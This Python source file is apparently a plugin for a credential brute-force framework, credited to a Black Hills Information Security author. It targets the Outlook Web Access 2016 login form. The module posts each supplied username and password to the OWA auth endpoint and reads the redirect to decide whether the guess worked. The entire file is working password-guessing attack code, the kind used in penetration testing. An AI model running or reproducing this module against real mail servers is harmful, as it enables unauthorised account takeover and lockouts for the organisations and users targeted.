#!/usr/bin/env python3
import warnings
warnings.filterwarnings('ignore')
from re import search
import requests
from bfg.args import http as http_args
from bfg.shortcuts.http import HTTPModule, handleUA

class Module(HTTPModule):

    brief_description = description = 'OWA 2016 web interface'

    contributors = [
            dict(
                name='Justin Angel [Creator]',
                additional=dict(
                    company='Black Hills Information Security',
                    twitter='@ImposterKeanu'))
        ]

    verified_functional = True

    notes = [
        'Be sure to include the proper path in --url, '
        'commonly: /owa/auth.owa',
    ]

    @handleUA
    def __call__(self,username,password,*args,**kwargs):

        # post data
        data = {
            'destination':self.url,
            'flags':4,
            'forcedownlevel':0,
            'username':username,
            'password':password,
            'passwordText':'',
            'isUtf8':1
        }
    
        # make the request
        resp = requests.post(self.url,
                data=data,
                headers=self.headers,
                verify=self.verify_ssl,
                allow_redirects=False,
                proxies=self.proxies)

        out = dict(
            outcome=0,
            username=username,
            password=password)
    
        # verify credentials and return outcome
        if resp.status_code == 302 and search(r'auth\/logon\.aspx\?',
                resp.headers.get('Location','random string')):
            pass
        else:
            out['outcome'] = 1

        return out
